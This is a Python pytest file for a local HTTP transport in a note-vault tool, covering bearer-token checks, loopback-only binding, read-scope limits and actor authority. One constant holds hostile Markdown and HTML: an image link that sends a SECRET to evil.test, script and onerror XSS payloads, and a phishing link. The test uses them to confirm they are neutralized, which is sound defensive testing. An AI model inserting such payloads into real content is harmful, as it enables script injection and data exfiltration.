"""Loopback HTTP transport tests."""

from __future__ import annotations

import hmac
import http.client
import json
import threading
import uuid
from http import HTTPStatus
from pathlib import Path
from types import SimpleNamespace

import pytest

from memoria_vault.cli import main
from memoria_vault.engine.surface_contract import http_routes
from memoria_vault.runtime import http_transport, state, worker
from memoria_vault.runtime.http_transport import (
    MAX_BODY_BYTES,
    PayloadTooLarge,
    _dispatch,
    _scope_intersection,
    is_authorized,
    make_http_server,
)
from memoria_vault.runtime.jsonl import iter_jsonl
from tests.helpers import init_cli_workspace, write_checked_note


@pytest.fixture
def workspace(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> Path:
    return init_cli_workspace(tmp_path, capsys)


def test_serve_http_once_reports_loopback_token(
    workspace: Path, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
) -> None:
    class FakeServer:
        server_address = ("127.0.0.1", 43210)

        def server_close(self) -> None:
            return

    monkeypatch.setenv("MEMORIA_HTTP_TOKEN", "test-token")
    monkeypatch.setattr(
        "memoria_vault.runtime.http_transport.bind_http_server",
        lambda *args, **kwargs: FakeServer(),
    )

    rc = main(
        [
            "serve",
            "--workspace",
            str(workspace),
            "--http",
            "--port",
            "0",
            "--once",
            "--json",
        ]
    )
    output = json.loads(capsys.readouterr().out)

    assert rc == 0
    assert output["ok"] is True
    assert output["url"] == "http://127.0.0.1:43210"
    assert output["port"] == 43210
    assert output["boot_id"]
    assert output["token"] is None
    assert output["token_source"] == "env"


def test_serve_http_rejects_non_loopback_host(
    workspace: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    rc = main(
        [
            "serve",
            "--workspace",
            str(workspace),
            "--http",
            "--host",
            "0.0.0.0",
            "--once",
            "--json",
        ]
    )
    output = json.loads(capsys.readouterr().out)

    assert rc == 2
    assert output == {"ok": False, "error": "serve --http only binds loopback hosts"}


def test_serve_http_passes_startup_read_scope(
    workspace: Path, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
) -> None:
    captured: dict[str, object] = {}

    class FakeServer:
        server_address = ("127.0.0.1", 43210)

        def server_close(self) -> None:
            return

    def fake_server(*args: object, **kwargs: object) -> FakeServer:
        captured["args"] = args
        captured["kwargs"] = kwargs
        return FakeServer()

    monkeypatch.setenv("MEMORIA_HTTP_TOKEN", "test-token")
    monkeypatch.setattr("memoria_vault.runtime.http_transport.bind_http_server", fake_server)

    rc = main(
        [
            "serve",
            "--workspace",
            str(workspace),
            "--http",
            "--read-scope",
            "notes/alpha.md",
            "--once",
            "--json",
        ]
    )

    assert rc == 0
    assert captured["kwargs"]["read_scope"] == ["notes/alpha.md"]


def test_serve_http_rejects_root_startup_read_scope(
    workspace: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    rc = main(
        [
            "serve",
            "--workspace",
            str(workspace),
            "--http",
            "--read-scope",
            "/",
            "--once",
            "--json",
        ]
    )
    output = json.loads(capsys.readouterr().out)

    assert rc == 2
    assert output == {"ok": False, "error": "http read_scope must be non-root"}


def test_http_transport_authorization_helper() -> None:
    assert is_authorized("Bearer test-token", "test-token")
    assert not is_authorized(None, "test-token")
    assert not is_authorized("Bearer other", "test-token")
    # A prefix match is not a match: comparing only `supplied[:len(expected)]`
    # would admit any header that merely starts with the right token.
    assert not is_authorized("Bearer test-tokenextra", "test-token")


def test_http_transport_authorization_compares_in_constant_time(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The per-boot token gates PI authority, so `==` would be a timing side channel."""
    calls: list[tuple[object, object]] = []

    def recording_compare_digest(left: bytes, right: bytes) -> bool:
        calls.append((left, right))
        return hmac.compare_digest(left, right)

    monkeypatch.setattr(
        http_transport, "hmac", SimpleNamespace(compare_digest=recording_compare_digest)
    )

    assert http_transport.is_authorized("Bearer test-token", "test-token") is True
    assert http_transport.is_authorized("Bearer other", "test-token") is False
    assert http_transport.is_authorized(None, "test-token") is False
    assert calls == [
        (b"Bearer test-token", b"Bearer test-token"),
        (b"Bearer other", b"Bearer test-token"),
        (b"", b"Bearer test-token"),
    ]


def test_http_transport_reads_status(workspace: Path) -> None:
    status, http_status = _dispatch(workspace, "GET", "/status", dict)

    assert http_status == HTTPStatus.OK
    assert status["ok"] is True
    assert status["api_version"] == "engine-read-api.v1"
    assert status["db"] == ".memoria/memoria.sqlite"
    assert status["workspace"] == str(workspace)


def test_http_transport_openapi_covers_registry_http_routes(workspace: Path) -> None:
    response, http_status = _dispatch(workspace, "GET", "/openapi.json", dict)

    assert http_status == HTTPStatus.OK
    assert response["openapi"] == "3.1.0"
    listed = {
        (method.upper(), path)
        for path, operations in response["paths"].items()
        for method in operations
    }
    assert listed == http_routes()
    assert _openapi_query_names(response, "/request") == {"id", "read_scope", "scope"}
    assert _openapi_query_names(response, "/concepts") == {"type", "read_scope", "scope"}
    assert _openapi_query_names(response, "/work") == {"id", "read_scope", "scope"}
    assert _openapi_query_names(response, "/exploration") == {"limit", "read_scope", "scope"}
    assert "request_id" not in _openapi_query_names(response, "/request")
    assert "concept_type" not in _openapi_query_names(response, "/concepts")
    assert "work_id" not in _openapi_query_names(response, "/work")


def test_http_transport_reads_attention_view_spec(workspace: Path) -> None:
    _write_attention(workspace, "alpha")

    response, http_status = _dispatch(workspace, "GET", "/attention?worklist=true", dict)

    assert http_status == HTTPStatus.OK
    block = response["view"]["blocks"][0]
    assert block["kind"] == "table"
    assert block["title"] == "Attention worklist"
    assert block["refs"] == ["inbox/alpha.md"]


def test_http_transport_passes_read_scope_to_engine_reads(workspace: Path) -> None:
    write_checked_note(workspace, "notes/alpha.md", "Alpha")
    write_checked_note(workspace, "notes/beta.md", "Beta")

    response, http_status = _dispatch(workspace, "GET", "/concepts?read_scope=notes/alpha.md", dict)

    assert http_status == HTTPStatus.OK
    assert [row["path"] for row in response["concepts"]] == ["notes/alpha.md"]
    response, http_status = _dispatch(
        workspace,
        "GET",
        "/concept?target=notes/beta.md&read_scope=notes/alpha.md",
        dict,
    )
    assert http_status == HTTPStatus.NOT_FOUND
    assert response["error"] == "target not found: notes/beta.md"


def test_http_transport_startup_read_scope_cannot_be_widened(workspace: Path) -> None:
    write_checked_note(workspace, "notes/alpha.md", "Alpha")
    write_checked_note(workspace, "notes/beta.md", "Beta")

    widened, widened_status = _dispatch(
        workspace,
        "GET",
        "/concepts?read_scope=notes",
        dict,
        read_scope=["notes/alpha.md"],
    )
    disjoint, disjoint_status = _dispatch(
        workspace,
        "GET",
        "/concepts?read_scope=notes/beta.md",
        dict,
        read_scope=["notes/alpha.md"],
    )

    assert widened_status == HTTPStatus.OK
    assert [row["path"] for row in widened["concepts"]] == ["notes/alpha.md"]
    assert disjoint_status == HTTPStatus.OK
    assert disjoint["concepts"] == []


def test_http_transport_scope_intersection_narrows_to_requested_subscope(
    workspace: Path,
) -> None:
    write_checked_note(workspace, "notes/alpha.md", "Alpha")
    write_checked_note(workspace, "notes/beta.md", "Beta")

    assert _scope_intersection(["notes"], ["notes/alpha.md"]) == ["notes/alpha.md"]

    narrowed, status = _dispatch(
        workspace,
        "GET",
        "/concepts?read_scope=notes/alpha.md",
        dict,
        read_scope=["notes"],
    )

    assert status == HTTPStatus.OK
    assert [row["path"] for row in narrowed["concepts"]] == ["notes/alpha.md"]


def test_http_transport_exploration_respects_read_scope(workspace: Path) -> None:
    state.upsert_catalog_record(
        workspace,
        work_id="source-alpha",
        title="Alpha",
        check_status="checked",
        concept_path="notes/alpha.md",
    )
    state.replace_work_graph_edges(
        workspace,
        "source-alpha",
        [
            {
                "relation_type": "references",
                "target_id": "https://openalex.org/W999",
                "target_title": "Uncaptured Work",
            }
        ],
    )

    visible, visible_status = _dispatch(
        workspace,
        "GET",
        "/exploration",
        dict,
        read_scope=["notes/alpha.md"],
    )
    hidden, hidden_status = _dispatch(
        workspace,
        "GET",
        "/exploration",
        dict,
        read_scope=["notes/beta.md"],
    )

    assert visible_status == HTTPStatus.OK
    assert [item["work_id"] for item in visible["exploration"]["items"]] == ["source-alpha"]
    assert hidden_status == HTTPStatus.OK
    assert hidden["exploration"]["items"] == []
    assert hidden["exploration"]["empty"] is True


def test_http_transport_rejects_root_read_scope(workspace: Path) -> None:
    response, http_status = _dispatch(workspace, "GET", "/concepts?read_scope=/", dict)
    startup_response, startup_status = _dispatch(
        workspace, "GET", "/concepts", dict, read_scope=["/"]
    )

    assert http_status == HTTPStatus.BAD_REQUEST
    assert response["error"] == "http read_scope must be non-root"
    assert startup_status == HTTPStatus.BAD_REQUEST
    assert startup_response["error"] == "http read_scope must be non-root"


def test_http_transport_new_read_routes_call_engine(
    workspace: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    seen: list[tuple[str, dict[str, object]]] = []

    def record(name: str):
        def wrapper(*args: object, **kwargs: object) -> dict[str, object]:
            seen.append((name, kwargs))
            return {"ok": True, name: True}

        return wrapper

    monkeypatch.setattr(
        "memoria_vault.runtime.http_transport.engine_api.read_journal", record("journal")
    )
    monkeypatch.setattr(
        "memoria_vault.runtime.http_transport.engine_api.read_journal_event",
        record("journal_event"),
    )
    monkeypatch.setattr(
        "memoria_vault.runtime.http_transport.engine_api.read_slice", record("slice")
    )
    monkeypatch.setattr(
        "memoria_vault.runtime.http_transport.engine_api.read_draft", record("draft")
    )
    monkeypatch.setattr(
        "memoria_vault.runtime.http_transport.engine_api.read_exploration",
        record("exploration"),
    )

    for path in (
        "/journal?limit=3&operation=op",
        "/journal/event?event_id=1",
        "/project/slice?project_path=projects/alpha/project.md",
        "/project/draft?project_path=projects/alpha/project.md",
        "/exploration?limit=2",
    ):
        response, http_status = _dispatch(workspace, "GET", path, dict, read_scope=["projects"])
        assert http_status == HTTPStatus.OK
        assert response["ok"] is True

    assert [name for name, _kwargs in seen] == [
        "journal",
        "journal_event",
        "slice",
        "draft",
        "exploration",
    ]
    assert seen[0][1]["limit"] == 3
    assert seen[0][1]["read_scope"] == ["projects"]
    assert seen[1][1]["read_scope"] == ["projects"]
    assert seen[2][1]["read_scope"] == ["projects"]
    assert seen[3][1]["read_scope"] == ["projects"]
    assert seen[4][1]["limit"] == 2
    assert seen[4][1]["read_scope"] == ["projects"]


def test_http_transport_route_status_codes(workspace: Path) -> None:
    unknown, unknown_status = _dispatch(workspace, "GET", "/missing", dict)
    wrong_method, wrong_status = _dispatch(workspace, "POST", "/status", dict)
    wrong_write_method, wrong_write_status = _dispatch(workspace, "GET", "/operation/run", dict)
    bad_body, bad_body_status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: _raise(ValueError("bad json")),
    )
    too_large, too_large_status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: _raise(PayloadTooLarge("request body too large")),
    )

    assert (unknown, unknown_status) == (
        {"ok": False, "error": "no such route: /missing"},
        HTTPStatus.NOT_FOUND,
    )
    assert (wrong_method, wrong_status) == (
        {"ok": False, "error": "method not allowed: POST /status"},
        HTTPStatus.METHOD_NOT_ALLOWED,
    )
    assert (wrong_write_method, wrong_write_status) == (
        {"ok": False, "error": "method not allowed: GET /operation/run"},
        HTTPStatus.METHOD_NOT_ALLOWED,
    )
    assert (bad_body, bad_body_status) == (
        {"ok": False, "error": "bad json"},
        HTTPStatus.BAD_REQUEST,
    )
    assert (too_large, too_large_status) == (
        {"ok": False, "error": "request body too large"},
        HTTPStatus.REQUEST_ENTITY_TOO_LARGE,
    )


def test_http_transport_operation_run_uses_request_envelope(workspace: Path) -> None:
    response, http_status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: {
            "operation_id": "create-concept",
            "payload": {
                "target_path": "notes/http.md",
                "content": ("---\ntype: note\ntitle: HTTP note\ntags: []\nlinks: {}\n---\nBody.\n"),
                "concept_type": "note",
            },
            "idempotency_key": "http-create",
            "actor": "agent",
            "agent_identity": "review-agent",
        },
    )

    assert http_status == HTTPStatus.OK
    assert response["ok"] is True
    assert (workspace / ".memoria/journal/memoria-http.jsonl").exists()
    assert [
        event["event"] for event in iter_jsonl(workspace / ".memoria/journal/memoria-http.jsonl")
    ] == ["derived"]
    with state.connect(workspace) as conn:
        row = conn.execute(
            """
            SELECT operation_id, actor, provenance_json, args_json
            FROM operation_requests
            WHERE request_id = ?
            """,
            ("http-create",),
        ).fetchone()
    assert row["operation_id"] == "create-concept"
    # The door assigns authority; the caller's "actor": "agent" body field is ignored.
    assert row["actor"] == "pi"
    assert json.loads(row["provenance_json"]) == {
        "surface": "memoria-http",
        "command": "http:create-concept",
        "agent_identity": "review-agent",
    }
    assert json.loads(row["args_json"])["target_path"] == "notes/http.md"
    with state.connect(workspace) as conn:
        journal = conn.execute(
            "SELECT payload_json FROM event_log"
            " WHERE json_extract(payload_json, '$.request_id') = ?",
            ("http-create",),
        ).fetchall()
    assert journal
    assert {
        tuple(sorted(json.loads(event["payload_json"])["request_provenance"].items()))
        for event in journal
    } == {
        tuple(
            sorted(
                {
                    "surface": "memoria-http",
                    "command": "http:create-concept",
                    "agent_identity": "review-agent",
                }.items()
            )
        )
    }


def test_http_transport_operation_run_uses_pi_authority_without_caller_actor(
    workspace: Path,
) -> None:
    _write_attention(workspace, "http-pi-resolve")

    response, http_status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: {
            "operation_id": "resolve-attention",
            "payload": {
                "target_id": "inbox/http-pi-resolve.md",
                "outcome": "apply",
                "routing_class": "ask",
                "reason": "authenticated pane disposition",
            },
            "idempotency_key": "http-pi-resolve",
        },
    )

    assert http_status == HTTPStatus.OK
    assert response["ok"] is True
    assert response["result"]["status"] == "done"
    request = state.request_row(workspace, "http-pi-resolve")
    assert request is not None
    assert request["actor"] == "pi"
    assert "attention_status: resolved" in (workspace / "inbox/http-pi-resolve.md").read_text(
        encoding="utf-8"
    )


def test_http_transport_operation_run_ignores_caller_supplied_actor(workspace: Path) -> None:
    """A body `actor` neither escalates past `pi` nor is echoed into the envelope."""
    response, http_status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: {
            "operation_id": "trace-integrity-scan",
            "payload": {},
            "idempotency_key": "http-claims-integrity",
            "actor": "integrity",
        },
    )

    assert http_status == HTTPStatus.OK
    assert response["ok"] is False
    assert response["result"]["status"] == "failed"
    assert response["result"]["error"] == "trace-integrity-scan requires integrity actor authority"
    request = state.request_row(workspace, "http-claims-integrity")
    assert request is not None
    assert request["actor"] == "pi"


HOSTILE_BODY = (
    "![exfil](https://evil.test/pixel?d=SECRET)\n"
    "\n"
    "<script>alert(1)</script>\n"
    "\n"
    "<img src=x onerror=alert(1)>\n"
    "\n"
    "[click me](https://evil.test/phish)\n"
)


def test_http_transport_neutralizes_machine_authored_bodies_despite_pi_authority(
    workspace: Path,
) -> None:
    """The door holds PI *authority*; the bodies it posts are still machine *authorship*.

    `trusted_writer` gates untrusted-Markdown neutralization on the operation
    context, so a door that only raised `actor` would have written every posted
    body verbatim. `machine_authored=True` keeps the CS1 defusal in force (#1596).
    """
    response, http_status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: {
            "operation_id": "create-concept",
            "payload": {
                "target_path": "notes/hostile.md",
                "content": (
                    "---\ntype: note\ntitle: Hostile\ntags: []\nlinks: {}\n---\n" + HOSTILE_BODY
                ),
                "concept_type": "note",
            },
            "idempotency_key": "http-hostile",
        },
    )

    assert http_status == HTTPStatus.OK
    assert response["ok"] is True
    written = (workspace / "notes/hostile.md").read_text(encoding="utf-8")
    # The defused form landed...
    assert "\\[exfil] (`https://evil.test/pixel?d=SECRET`)" in written
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in written
    assert "&lt;img src=x onerror=alert(1)&gt;" in written
    assert "click me (`https://evil.test/phish`)" in written
    # ...and none of the live forms did.
    assert "![exfil](" not in written
    assert "<script>" not in written
    assert "<img src=x" not in written
    assert "[click me](" not in written
    # Authorship is recorded on the envelope the worker binds its context from.
    request = state.request_row(workspace, "http-hostile")
    assert request is not None
    assert request["actor"] == "pi"
    job = state.request_job(workspace, "http-hostile")
    assert job is not None
    assert job["request_envelope"]["machine_authored"] is True
    assert job["bound_context"]["machine_authored"] is True


def test_http_transport_pi_authority_still_runs_pi_reserved_operations(
    workspace: Path,
) -> None:
    """Neutralizing machine-authored bodies must not cost the door its PI authority.

    `cascade-rollback` is PI-reserved in `PROTECTED_OPERATION_ACTORS`, and
    `_require_operation_actor` is the first check inside `_run_operation_job` —
    so reaching a `done` result proves the actor guard passed at the door.
    """
    worker.enqueue_trusted_write(
        workspace,
        "notes/rollback.md",
        "---\ntype: note\ntitle: Rollback\ntags: []\nlinks: {}\n---\nBody.\n",
        idempotency_key="write-rollback",
        actor="operation",
    )
    worker.run_next_job(workspace, machine="test-machine")
    assert (workspace / "notes/rollback.md").is_file()

    response, http_status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: {
            "operation_id": "cascade-rollback",
            "payload": {
                "target_id": "notes/rollback.md",
                "reason": "pane rollback",
                "include_target": True,
            },
            "idempotency_key": "http-rollback",
        },
    )

    assert http_status == HTTPStatus.OK
    assert response["result"].get("error") != "cascade-rollback requires PI actor authority"
    assert response["ok"] is True
    assert response["result"]["status"] == "done"
    assert response["result"]["rollback"]["reverted"] == ["notes/rollback.md"]
    assert not (workspace / "notes/rollback.md").exists()
    request = state.request_row(workspace, "http-rollback")
    assert request is not None
    assert request["actor"] == "pi"


def test_http_transport_rejects_idempotency_key_bound_to_pending_pi_request(
    workspace: Path,
) -> None:
    _write_attention(workspace, "pi-pending")
    request = worker.enqueue_operation(
        workspace,
        "resolve-attention",
        actor="pi",
        idempotency_key="pi-pending-request",
        payload={
            "target_id": "inbox/pi-pending.md",
            "outcome": "apply",
            "routing_class": "ask",
            "reason": "PI decision",
        },
    )

    listed, listed_status = _dispatch(
        workspace,
        "GET",
        "/requests?status=pending",
        dict,
        read_scope=["inbox"],
    )
    response, status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: {
            "operation_id": "create-concept",
            "payload": {"concept_type": "note"},
            "idempotency_key": request["job_id"],
        },
    )

    assert listed_status == HTTPStatus.OK
    assert listed["requests"] == [
        {
            "request_id": "pi-pending-request",
            "operation_id": "resolve-attention",
            "status": "pending",
            "created_at": listed["requests"][0]["created_at"],
            "completed_at": None,
            "error": "",
        }
    ]
    assert status == HTTPStatus.BAD_REQUEST
    assert response == {
        "ok": False,
        "error": "idempotency key is already bound to a different request",
    }
    assert state.request_job(workspace, request["job_id"])["status"] == "pending"
    assert "attention_status: open" in (workspace / "inbox/pi-pending.md").read_text(
        encoding="utf-8"
    )


def test_http_transport_operation_run_records_empirical_event_once(workspace: Path) -> None:
    event_id = str(uuid.uuid4())
    event = {
        "event_id": event_id,
        "event_type": "disposition.recorded",
        "timestamp": "2026-07-08T00:00:00Z",
        "session_id": str(uuid.uuid4()),
        "surface": "obsidian",
        "workflow": "gap",
        "decision": "defer",
        "reason_code": "other",
    }

    response, http_status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: {
            "operation_id": "empirical-event-record",
            "payload": event,
            "idempotency_key": f"empirical-event:{event_id}",
            "actor": "agent",
        },
    )
    replay, replay_status = _dispatch(
        workspace,
        "POST",
        "/operation/run",
        lambda: {
            "operation_id": "empirical-event-record",
            "payload": event,
            "idempotency_key": f"empirical-event:{event_id}",
            "actor": "agent",
        },
    )

    assert http_status == HTTPStatus.OK
    assert replay_status == HTTPStatus.OK
    assert response["ok"] is True
    assert replay["job"]["status"] == "done"
    assert replay["job"]["job_id"] == response["job"]["job_id"]
    with state.connect(workspace) as conn:
        count = conn.execute(
            "SELECT COUNT(*) FROM event_log WHERE event_type = 'empirical-event'"
        ).fetchone()[0]
        request = conn.execute(
            "SELECT operation_id, provenance_json FROM operation_requests WHERE request_id = ?",
            (response["job"]["job_id"],),
        ).fetchone()
    assert count == 1
    assert request["operation_id"] == "empirical-event-record"
    assert json.loads(request["provenance_json"]) == {
        "surface": "memoria-http",
        "command": "http:empirical-event-record",
    }
    assert not list((workspace / "notes").glob("*.md"))
    assert not list((workspace / "projects").glob("**/*.md"))


def test_http_transport_unknown_write_does_not_create_request(workspace: Path) -> None:
    response, http_status = _dispatch(
        workspace,
        "POST",
        "/raw-sql",
        lambda: {"operation_id": "answer-query"},
    )

    assert http_status == HTTPStatus.NOT_FOUND
    assert response == {"ok": False, "error": "no such route: /raw-sql"}
    with state.connect(workspace) as conn:
        count = conn.execute("SELECT COUNT(*) FROM operation_requests").fetchone()[0]
    assert count == 0


def test_http_server_handler_enforces_bearer_auth_and_body_size(workspace: Path) -> None:
    server = make_http_server(workspace, host="127.0.0.1", port=0, token="test-token")
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    host, port = server.server_address[0], server.server_address[1]
    try:
        no_auth = _http_request(host, port, "GET", "/status", {})
        wrong_auth = _http_request(host, port, "GET", "/status", {"Authorization": "Bearer wrong"})
        authorized = _http_request(
            host, port, "GET", "/status", {"Authorization": "Bearer test-token"}
        )
        oversized = _http_request(
            host,
            port,
            "POST",
            "/operation/run",
            {
                "Authorization": "Bearer test-token",
                "Content-Length": str(MAX_BODY_BYTES + 1),
            },
        )
    finally:
        server.shutdown()
        thread.join(timeout=5)
        server.server_close()

    assert no_auth == (
        HTTPStatus.UNAUTHORIZED,
        {"ok": False, "error": "unauthorized: missing or invalid bearer token"},
    )
    assert wrong_auth == (
        HTTPStatus.UNAUTHORIZED,
        {"ok": False, "error": "unauthorized: missing or invalid bearer token"},
    )
    assert authorized[0] == HTTPStatus.OK
    assert authorized[1]["ok"] is True
    assert authorized[1]["api_version"] == "engine-read-api.v1"
    assert oversized == (
        HTTPStatus.REQUEST_ENTITY_TOO_LARGE,
        {"ok": False, "error": "request body too large"},
    )


def test_http_server_refuses_unauthenticated_operation_run_before_the_write_seam(
    workspace: Path,
) -> None:
    """PI authority lives behind the bearer gate: no token, no enqueue, no vault change."""
    _write_attention(workspace, "unauthenticated-resolve")
    body = json.dumps(
        {
            "operation_id": "resolve-attention",
            "payload": {
                "target_id": "inbox/unauthenticated-resolve.md",
                "outcome": "apply",
                "routing_class": "ask",
                "reason": "no bearer token",
            },
            "idempotency_key": "http-unauthenticated",
        }
    ).encode("utf-8")
    server = make_http_server(workspace, host="127.0.0.1", port=0, token="test-token")
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    host, port = server.server_address[0], server.server_address[1]
    try:
        refused = _http_request(
            host,
            port,
            "POST",
            "/operation/run",
            {"Content-Type": "application/json", "Content-Length": str(len(body))},
            body=body,
        )
    finally:
        server.shutdown()
        thread.join(timeout=5)
        server.server_close()

    assert refused == (
        HTTPStatus.UNAUTHORIZED,
        {"ok": False, "error": "unauthorized: missing or invalid bearer token"},
    )
    with state.connect(workspace) as conn:
        count = conn.execute("SELECT COUNT(*) FROM operation_requests").fetchone()[0]
    assert count == 0
    assert "attention_status: open" in (workspace / "inbox/unauthenticated-resolve.md").read_text(
        encoding="utf-8"
    )


def _raise(exc: Exception) -> None:
    raise exc


def _http_request(
    host: str,
    port: int,
    method: str,
    path: str,
    headers: dict[str, str],
    body: bytes | None = None,
) -> tuple[HTTPStatus, dict]:
    conn = http.client.HTTPConnection(host, port, timeout=10)
    try:
        conn.putrequest(method, path)
        for name, value in headers.items():
            conn.putheader(name, value)
        conn.endheaders()
        if body is not None:
            conn.send(body)
        response = conn.getresponse()
        return HTTPStatus(response.status), json.loads(response.read().decode("utf-8"))
    finally:
        conn.close()


def _openapi_query_names(response: dict[str, object], path: str) -> set[str]:
    operation = response["paths"][path]["get"]
    return {parameter["name"] for parameter in operation["parameters"]}


def _write_attention(workspace: Path, name: str) -> None:
    path = workspace / "inbox" / f"{name}.md"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        "\n".join(
            [
                "---",
                "projection: attention",
                f"title: {name}",
                "attention_kind: work-prompt",
                "attention_status: open",
                "routing_class: ask",
                "---",
                "Review.",
                "",
            ]
        ),
        encoding="utf-8",
    )
